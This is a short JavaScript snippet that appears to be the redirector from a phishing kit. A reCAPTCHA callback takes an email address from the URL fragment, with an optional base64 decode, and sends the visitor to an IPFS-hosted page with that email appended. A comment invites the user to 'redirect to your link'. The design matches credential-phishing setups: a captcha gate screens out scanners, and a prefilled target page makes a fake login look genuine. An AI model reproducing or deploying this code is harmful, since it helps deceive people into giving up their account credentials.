
function recaptchaCallback(){
 var hash = window.location.hash; 
 if( hash !== ""){
     hash = hash.split('#');
     
     //normal email
     const email = hash[1]; // to split between # and email are normal string
     //base64
     //const email = atob(email); // to split between # and email are base64
     
     window.location.href = "https://ipfs.io/ipfs/bafybeibncxny56jrvjrsyz3akkpo6cy7s4zfoetfs37ijncohsxt7almaq/mabebi.html#" + email; //redirect to your link
 }else{
     window.location.href = "https://ipfs.io/ipfs/bafybeibncxny56jrvjrsyz3akkpo6cy7s4zfoetfs37ijncohsxt7almaq/mabebi.html#";
 }
}
